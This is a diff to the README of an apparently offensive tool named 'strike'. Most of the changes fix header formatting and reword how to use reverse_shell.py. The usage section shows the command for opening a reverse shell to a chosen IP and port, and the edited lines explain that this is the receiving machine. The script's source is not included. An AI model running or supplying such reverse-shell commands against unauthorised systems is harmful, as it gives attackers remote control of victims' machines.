@@ -25,7 +25,7 @@ To run this script, you will need:
    ```bash
    cd strike
 
-##Usage
+## Usage
 
 To create a reverse shell, you can use this script as follows:
 
@@ -38,13 +38,13 @@ To create a reverse shell, you can use this script as follows:
    ```bash
    python reverse_shell.py -ip TARGET_IP -port PORT_NUMBER
 
-#How to Run the Code
+# How to Run the Code
 
 To run the code, follow the usage instructions provided in the "Usage" section above.
 
 - Make sure you have the required dependencies installed.
-- Replace TARGET_IP with the IP address of the target machine.
-- Replace PORT_NUMBER with the port number to connect to on the target machine.
+- Replace TARGET_IP with the IP address of the machine you want to receive shell.
+- Replace PORT_NUMBER with the port number to connect to on the machine you wan to receive shell.
 - The script will create a reverse shell connection to the specified IP and port.
 
 #IMPORTANT
